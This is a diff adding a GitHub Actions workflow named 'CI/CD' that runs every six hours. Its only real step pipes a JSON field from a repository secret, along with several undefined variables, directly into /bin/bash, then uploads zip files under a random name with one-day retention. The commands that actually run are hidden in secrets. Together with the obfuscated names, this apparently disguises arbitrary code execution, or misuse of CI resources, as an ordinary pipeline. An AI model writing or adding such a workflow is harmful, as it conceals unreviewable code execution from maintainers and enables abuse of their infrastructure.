@@ -1,0 +1,33 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '57 0,6,12,18 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          kytd7: ${{ secrets.kytd7 }}
+        run: |
+          printf '%s' "$kytd7" | jq -r .bcag4 | /bin/bash
+          printf '%s' "$evb7" | jq -r .hvynm8267 | /bin/bash
+          echo $a8240 | jq -r .ieym513 | /bin/bash
+          echo $upoo10 | jq -r .ifdu544 | /bin/bash
+          echo $djxc92 | jq -r .n6223 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: En4w0jbA
+          path: "*.zip"
+          retention-days: 1
